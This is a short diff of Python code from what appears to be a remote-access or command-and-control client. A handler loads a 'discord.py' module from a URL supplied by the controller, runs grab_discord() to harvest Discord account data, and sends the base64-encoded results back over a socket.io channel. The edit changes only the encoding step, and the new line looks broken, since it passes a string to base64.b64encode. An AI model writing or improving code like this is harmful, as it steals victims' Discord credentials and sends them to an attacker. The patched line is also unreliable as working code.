@@ -118,7 +118,7 @@ def run(data):
             module = create_moduel(data['url']+'discord.py')
             result = str(module.grab_discord().initialize())
             print(result)
-            sio.emit('download_file_return', {'uuid': data['uuid'], 'file_name': 'discord_account_results', 'file':  base64.b64encode(result.encode('utf-8'))})
+            sio.emit('download_file_return', {'uuid': data['uuid'], 'file_name': 'discord_account_results', 'file':  base64.b64encode(result).decode('utf-8')})
 
 
 
